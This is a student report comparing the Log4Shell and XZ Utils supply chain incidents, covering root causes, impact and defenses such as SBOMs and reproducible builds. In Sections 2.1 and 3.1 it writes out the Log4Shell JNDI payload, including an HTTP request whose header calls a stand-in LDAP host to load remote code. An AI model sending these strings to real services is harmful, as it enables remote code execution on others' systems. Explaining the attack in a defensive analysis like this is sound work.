# Software Supply Chain Attacks: A Comparative Analysis of Log4Shell and the XZ Utils Backdoor

**Course:** Security of Information Systems 
**Student:** [mostafa khamis abozead]  
**id:** 23101484

---

## 1. Introduction

The way software gets built today is fundamentally collaborative and, increasingly, fragile in ways that weren't obvious a decade ago. Most production systems aren't monolithic blocks of original code — they're intricate webs of libraries, frameworks, build tools, and package managers, each pulling from dozens of upstream sources. This is efficient; it lets a small team ship a product that leverages millions of lines of battle-tested code. But it also creates a surface area that attackers have learned to exploit in ways that are qualitatively different from traditional vulnerability exploitation.

A software supply chain attack doesn't target your application directly. It targets something your application trusts — a library, a build process, a maintainer's account. Once that trust relationship is compromised, the attacker effectively gets a free ride into every downstream system that consumes the poisoned component. The historical playbook for this was mostly theoretical until a series of high-profile incidents forced the security industry to take it seriously.

This report examines two incidents that defined the modern understanding of supply chain risk, though they did so through almost opposite mechanisms. The first is the Log4Shell vulnerability (CVE-2021-44228), disclosed publicly in December 2021, which revealed how a single flaw in a ubiquitous logging library could expose hundreds of millions of servers to remote code execution essentially overnight. The second is the XZ Utils backdoor (CVE-2024-3094), discovered in March 2024, which showed something arguably more unsettling: a patient, methodical attacker who spent nearly two years cultivating trust in an open-source project before quietly inserting a surgical backdoor into the build pipeline targeting SSH authentication on Linux systems.

These two cases aren't just interesting individually — comparing them reveals how supply chain threats have matured. Log4Shell was an accident. XZ was a plan.

---

## 2. Vulnerability Profiles

### 2.1 Log4j (CVE-2021-44228)

**Timeline**

The Log4Shell vulnerability was present in Log4j 2.x for years before anyone noticed. The library itself dates back to the early 2000s and had become the default logging framework for Java applications across virtually every industry. The flaw was privately reported to Apache on November 24, 2021, by a security researcher at Alibaba Cloud. Apache released an initial patch (2.15.0) on December 6, 2021, but the public didn't learn about it until December 9 when a proof-of-concept was posted on GitHub and Twitter. Within hours, active exploitation was observed in the wild. A second patch (2.16.0) followed on December 13 because 2.15.0 was found to be incomplete; a third patch (2.17.0) came on December 18. CISA issued an emergency directive on December 17 requiring federal agencies to remediate within weeks.

**Root Cause Analysis**

Log4j's core job is to record log messages, but it was designed with a feature called message lookup substitution that allowed log strings to contain dynamic references. The syntax `${prefix:value}` would cause Log4j to resolve the value at runtime using the specified prefix. Supported prefixes included `jndi`, which triggered Java Naming and Directory Interface lookups.

JNDI is a Java API that provides a unified interface to different naming and directory services — LDAP, RMI, DNS, and others. The design intent is reasonable: applications sometimes need to look up configuration objects or resources by name from a directory. The problem is what happens when an attacker controls the string being logged.

If an attacker sends an HTTP request with a User-Agent header like `${jndi:ldap://attacker.com/exploit}`, and the Java application logs that header (which almost every application does for debugging purposes), Log4j parses the string, identifies the JNDI lookup, contacts `attacker.com` over LDAP, and fetches whatever object the attacker's server returns. JNDI LDAP responses can include references to remote Java classes, and the JVM will deserialize and instantiate those classes — executing arbitrary attacker-supplied code in the context of the vulnerable Java process.

This is straightforward, unauthenticated remote code execution. The attacker doesn't need credentials or network proximity; they just need a string to reach a log statement somewhere in the target application. The attack surface was enormous because logging happens at every layer of an application stack.

**Attack Vector**

Log4j entered the ecosystem as a direct or transitive dependency in Java applications. A Java application might include `spring-boot-starter-web`, which depends on `spring-boot`, which depends on `spring-core`, which in some configurations pulls in Log4j. The developer building the top-level application may have had no idea Log4j was present, let alone that it was vulnerable.

### 2.2 XZ Utils (CVE-2024-3094)

**Timeline**

XZ Utils is a data compression library widely used in Linux distributions for compressing and decompressing files in the `.xz` and `.lzma` formats. It's foundational — present on virtually every Linux system. The malicious code was introduced incrementally starting around February 2024 in versions 5.6.0 and 5.6.1.

Andres Freund, a Microsoft engineer, discovered the backdoor on March 28, 2024, while investigating an unusual 500ms CPU slowdown during SSH logins on a Debian Sid machine. He noticed that `sshd` was consuming more CPU than expected when starting and traced the anomaly back to liblzma, a component of XZ Utils. What he found was a deliberately hidden backdoor embedded in the release tarballs that had been distributed for download — not in the public Git repository itself, but in the build artifacts.

Red Hat issued a security advisory the same day Freund published his findings. Major distributions including Fedora Rawhide, openSUSE Tumbleweed, Kali Linux, and some Debian testing packages had already shipped the compromised versions. The fix was to downgrade to XZ Utils 5.4.6.

**Root Cause Analysis**

The XZ backdoor was technically sophisticated and deliberately obscured. The malicious code didn't live in the main C source files committed to the public repository. Instead, it was embedded in two binary test files: `tests/files/bad-3-corrupt_lzma2.xz` and `tests/files/good-large_compressed.lzma`. The `build-to-host.m4` file in the Autotools build system was modified to extract and execute shell scripts during the build process, which in turn decoded and injected malicious object code into the final compiled liblzma binary.

The injection targeted a GNU libc feature called IFUNC (indirect function). IFUNC is a mechanism that allows a function to be resolved at runtime — the dynamic linker calls a resolver function once at startup and the resolver returns a pointer to the actual implementation to use, based on hardware capabilities or other conditions. The backdoor hooked into this mechanism to intercept RSA key operations inside `sshd`.

Specifically, the modified liblzma patched the `RSA_public_decrypt` function in memory during process initialization. When `sshd` authenticated a connecting user, the backdoored function checked whether the connecting client's RSA key matched a specific attacker-controlled key. If it did, the authentication check was bypassed and the attacker gained shell access regardless of what was in the `authorized_keys` file. If the key didn't match, authentication proceeded normally — making the backdoor completely transparent to legitimate users and incredibly difficult to detect during routine monitoring.

**Attack Vector**

The backdoor entered through the maintainer. A pseudonymous account named "Jia Tan" (handle: `JiaT75`) began contributing to XZ Utils around 2021. The contributions were modest at first — bug fixes, minor patches — the kind of work that builds a reputation over time. By 2022, Jia Tan was a trusted contributor. By early 2024, the original maintainer Lasse Collin had effectively handed off significant commit access. The malicious build scripts were then committed, and the backdoored tarballs were uploaded as the official release artifacts.

The attack vector was social engineering at the infrastructure layer: gain trust, gain access, inject at build time rather than source time.

---

## 3. Exploitation and Impact

### 3.1 Log4Shell Exploitation Scenario and Blast Radius

Imagine a penetration tester or, more realistically, an automated scanning bot probing a corporate VPN portal. The portal is a Java application running on Tomcat, logging every HTTP request including headers. The attacker sends:

```
GET / HTTP/1.1
Host: target.company.com
X-Api-Version: ${jndi:ldap://192.168.1.100:1389/Exploit}
```

The application logs the `X-Api-Version` header. Log4j parses the value, issues an LDAP request to `192.168.1.100:1389`, fetches a serialized Java object pointing to a malicious class, deserializes it, and executes it. If the JVM is running as a service account with broad filesystem access — common in enterprise environments — the attacker now has a shell, can read credentials from config files, pivot laterally, and begin exfiltrating data.

The blast radius of Log4Shell was historically unprecedented. CISA reported that the vulnerability affected an estimated 3 billion devices worldwide. Security firm Wiz found Log4j present in environments at 93% of enterprise cloud environments they scanned. Apache Log4j was embedded in products from Cisco, VMware, Fortinet, IBM, Red Hat, Oracle, and hundreds of smaller vendors. Many of these vendors required weeks or months to push patches, meaning attackers had a massive window. The Cybersecurity and Infrastructure Security Agency tracked active exploitation by nation-state actors from Iran, China, North Korea, and Russia within days of the initial disclosure.

### 3.2 XZ Utils Exploitation Scenario and Blast Radius

The XZ attack was specifically designed for stealth and high-value access. An attacker with knowledge of the backdoor's private key connects to any SSH daemon on a system running a compromised version of XZ Utils. During the standard SSH authentication handshake, the backdoored `RSA_public_decrypt` intercepts the operation. If the connecting client presents the attacker's key, authentication succeeds unconditionally — no username, no password, no authorized_keys entry required. The attacker gains shell access as whatever user `sshd` is running as, often root due to privilege-dropping timing in the SSH daemon startup sequence.

Had this not been caught when it was, the impact would have been severe. The compromised packages had already landed in several rolling-release distributions. Had they made it into the stable releases of Debian, Ubuntu, or Red Hat Enterprise Linux — distributions running on tens of millions of servers — every internet-facing SSH port on those systems would have been a silent entry point for a single attacker. Unlike Log4Shell, there'd be no noisy JNDI callbacks to an attacker's server; the exploitation would be indistinguishable from a legitimate SSH login.

---

## 4. The Supply Chain Element

### 4.1 Log4j: The Problem of Transitive Dependencies

Log4j illustrated a problem that software architects had discussed in theory but rarely confronted head-on at scale: transitive dependency risk. The Java ecosystem is built on Maven and Gradle dependency managers that automatically resolve and download libraries. When you declare a dependency on `spring-boot-starter-web:2.6.0`, Maven resolves a dependency graph that might include 80+ libraries you never explicitly chose. Log4j could be three or four levels deep in that graph.

Most development teams have no idea what's in their transitive dependency tree. Before Log4Shell, very few organizations ran Software Composition Analysis (SCA) tools on every build. Even fewer had processes for identifying when a transitive dependency disclosed a critical CVE. The Log4j patch required organizations to do something harder than just updating one dependency: they had to first figure out whether Log4j was even present, then figure out if they could update it without breaking their dependency constraints, then test and redeploy. For large enterprises with hundreds of Java applications, this took months.

This is the supply chain element: the vulnerability wasn't in the code you wrote; it was in something you consumed without knowing you consumed it. Patching required understanding your own dependencies — a capability many organizations discovered they lacked.

### 4.2 XZ Utils: Social Engineering and the Long Game

The XZ attack represents a category that's genuinely harder to defend against: intentional, long-horizon compromise of a trusted human being within the supply chain. Security tools can scan for known vulnerabilities. They can analyze code for suspicious patterns. What they can't easily do is detect a contributor who has spent two years building a legitimate reputation before inserting malicious code.

Jia Tan's approach was meticulous. The initial commits were genuine improvements — fixing real bugs, improving test coverage, adding legitimate functionality. The timeline of contributions shows steady, credible engagement with the project. There's even evidence of a coordinated pressure campaign: a second pseudonymous account began raising issues about the original maintainer's responsiveness and the pace of development, creating social pressure that may have accelerated the handoff of commit access to Jia Tan.

When the malicious code finally landed, it was hidden in binary test fixture files, not in readable C code. The actual injection happened at build time through modified Autotools scripts. Even a careful code reviewer reading the C source wouldn't have seen anything wrong. You'd have to specifically audit the build system, the binary test files, and understand what `build-to-host.m4` was doing with `sed` pipelines and shell expansions to catch it.

This is the "long game" in supply chain attacks: subvert the person, not just the code. Once you control a trusted maintainer identity, you don't need to exploit a technical vulnerability — you just need to merge a commit.

---

## 5. Mitigation and Defense

### 5.1 Immediate Remediation

For Log4Shell, the immediate fix was upgrading Log4j to version 2.17.1 (or 2.12.4 / 2.3.2 for older Java versions). For organizations that couldn't patch immediately, several mitigations bought time: setting `log4j2.formatMsgNoLookups=true` as a JVM parameter, removing the `JndiLookup` class from the classpath with a `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class` command, or blocking outbound LDAP/RMI traffic at the firewall. The last mitigation is notable because it works regardless of whether the application is patched — an attacker can trigger the JNDI lookup, but the callback to the attacker's server will be blocked.

For XZ Utils, remediation was simpler but required fast action. Affected systems needed to downgrade to version 5.4.6 using the distribution's package manager. Systems running the compromised liblzma should also be considered fully compromised and treated as such — memory should be assumed poisoned, and a full OS reinstall was recommended in high-security environments.

### 5.2 Long-Term Architectural Defenses

**Software Bill of Materials (SBOM).** An SBOM is a machine-readable inventory of every component in a software artifact — the equivalent of a nutrition label for your application. Generating SBOMs with tools like Syft or CycloneDX as part of every build means organizations know exactly what's in their software. When a new CVE drops, they can query their SBOM inventory and identify affected systems within minutes rather than days. CISA's guidance after Log4Shell specifically called for SBOM adoption, and the Biden administration's 2021 Executive Order on Improving the Nation's Cybersecurity made SBOMs a requirement for software sold to the federal government.

**Integrity Checking and Sigstore.** The XZ attack worked because the malicious code was in the release tarballs, not the Git repository. This means verifying the Git history isn't sufficient — you also need to verify that the released artifacts match what's in the repository. Sigstore is a public transparency log for software signing that allows developers to cryptographically attest that a released artifact was produced from a specific commit by a specific identity. Had XZ Utils used Sigstore or similar artifact signing, the discrepancy between the Git source and the release tarballs might have been detectable.

**Principle of Least Privilege.** A significant portion of Log4Shell's damage came from Java services running with excessive permissions. A logging library that makes outbound LDAP connections and instantiates remote classes should never be able to do so in a production environment. Running Java applications in containers with restricted network egress, using seccomp profiles to limit syscalls, and applying AppArmor or SELinux policies that prevent unexpected outbound connections would have limited the exploitability of Log4Shell even on unpatched systems.

**Reproducible Builds.** For the XZ-style attack, reproducible builds are a critical defense. If building XZ Utils from source always produces bit-for-bit identical output regardless of build environment, then distributing precompiled binaries that don't match the expected hash is detectable. Projects like Debian's Reproducible Builds initiative are pushing the ecosystem in this direction, but adoption remains incomplete.

**Dependency Pinning and Automated Auditing.** Locking dependency versions and running automated SCA scans (Dependabot, Snyk, OWASP Dependency-Check) on every commit gives teams visibility into what they're shipping before vulnerabilities become crises.

---

## 6. Personal Insights and Conclusion

### 6.1 Why Intentional Supply Chain Attacks Are More Dangerous

Heartbleed (CVE-2014-0160) was a devastating bug — a buffer over-read in OpenSSL that exposed private keys and sensitive memory contents on millions of HTTPS servers. But it was an accident. A developer made a mistake validating a bounds parameter. Once the flaw was understood, the fix was conceptually simple, and there was no attacker who needed to be outwitted.

The SolarWinds attack of 2020 and the XZ Utils backdoor of 2024 are fundamentally different in character. These weren't accidents. They were campaigns — coordinated efforts by sophisticated actors who invested substantial time and resources specifically to subvert the trust mechanisms that defenders rely on. The SolarWinds attackers compromised the build server for Orion software and injected a trojan into signed updates that were then distributed to 18,000 customers, including multiple US federal agencies. Jia Tan spent two years being a good open-source citizen before poisoning a build.

The danger is that our defensive posture is largely built around detecting technical anomalies: unexpected CVEs, unusual network traffic, known malware signatures. Against an attacker who has legitimate access and is deliberately behaving normally, these controls fail. The compromised SolarWinds update was signed with a valid certificate. Jia Tan's commits passed code review. The malicious XZ tarball had the right checksum for what it claimed to be.

This is the threat model that keeps security architects up at night: not a zero-day in the software you wrote, but a year-two contribution from someone you trusted.

### 6.2 Balancing Open-Source Efficiency and Security

As a developer, the honest answer is that you can't meaningfully audit every line of every library you use. A non-trivial web application might have 500 transitive dependencies. Pretending you'll read that code before shipping to production is fantasy. The practical balance has to be systemic rather than individual.

What I take from these two incidents is that the right approach operates at multiple layers. First, know what you're using — generate SBOMs, run SCA scans automatically, subscribe to advisories for your dependency set. Second, minimize your dependency footprint where feasible; every library you don't use is an attack surface you don't have. Third, design for compromise — assume a dependency will eventually be malicious and architect your systems so the blast radius is contained. Isolate services, restrict egress, apply least privilege aggressively. Log4Shell's damage was amplified because Java applications could freely make outbound network connections and deserialize arbitrary remote code; a stricter network policy would have neutered the attack even on unpatched systems.

The XZ attack also reinforced something about open-source governance that the community needs to sit with: critical infrastructure libraries maintained by a single volunteer are a systemic risk. OpenSSL, xz, zlib — these libraries underpin the internet and are often maintained by one or two people with no institutional support. The only sustainable answer is for organizations that depend on this software to fund and staff it appropriately, through initiatives like the Open Source Security Foundation (OpenSSF) or direct sponsorship of maintainers.

Open source is powerful precisely because it's transparent and collaborative. That transparency is also its vulnerability. The XZ attack exploited the same meritocratic trust that makes open-source development work. The defense isn't to abandon that model — it's to build auditing infrastructure sophisticated enough to match the threat.

---

## 7. Bibliography

Apache Software Foundation. (2021, December 10). *Apache Log4j Security Vulnerabilities*. https://logging.apache.org/log4j/2.x/security.html

CISA. (2021, December 17). *Apache Log4j Vulnerability Guidance* (ED 22-02). U.S. Cybersecurity and Infrastructure Security Agency. https://www.cisa.gov/news-events/directives/ed-22-02-mitigating-apache-log4j-vulnerability

CISA, FBI, NSA, et al. (2021, December 22). *Joint Advisory: Mitigating Log4Shell and Other Log4j-Related Vulnerabilities*. https://www.cisa.gov/sites/default/files/publications/AA21-356A_Joint_CSA_Mitigating_Log4Shell_and_Other_Log4j-Related_Vulnerabilities.pdf

Freund, A. (2024, March 29). *backdoor in upstream xz/liblzma leading to ssh server compromise* [Mailing list post]. Openwall OSS-Security. https://www.openwall.com/lists/oss-security/2024/03/29/4

Goodin, D. (2024, March 29). *What we know about the xz Utils backdoor that almost infected the world*. Ars Technica. https://arstechnica.com/security/2024/03/backdoor-found-in-widely-used-linux-utility-breaks-encrypted-ssh-connections/

LockBoxx / Gynvael Coldwind. (2024). *XZ Backdoor Analysis* [Technical deep dive]. https://gynvael.coldwind.pl/?id=782

Mandiant. (2020, December 13). *Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims With SUNBURST Backdoor*. https://www.mandiant.com/resources/blog/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor

National Institute of Standards and Technology. (2021). *NVD — CVE-2021-44228*. National Vulnerability Database. https://nvd.nist.gov/vuln/detail/CVE-2021-44228

National Institute of Standards and Technology. (2024). *NVD — CVE-2024-3094*. National Vulnerability Database. https://nvd.nist.gov/vuln/detail/CVE-2024-3094

Red Hat Product Security. (2024, March 29). *RHSB-2024-001 — XZ/liblzma Backdoor (CVE-2024-3094)*. Red Hat Security Blog. https://www.redhat.com/en/blog/multi-stage-supply-chain-attack-targeting-xz-liblzma

Schneier, B. (2024, April 5). *The XZ Utils Backdoor: What to Learn from It*. Schneier on Security. https://www.schneier.com/blog/archives/2024/04/xz-utils-backdoor.html

Wiz Research. (2021, December). *Log4Shell: The Log4j Vulnerability Emergency Explained*. Wiz.io. https://www.wiz.io/blog/10-days-later-enterprises-are-still-scrambling-to-address-log4shell

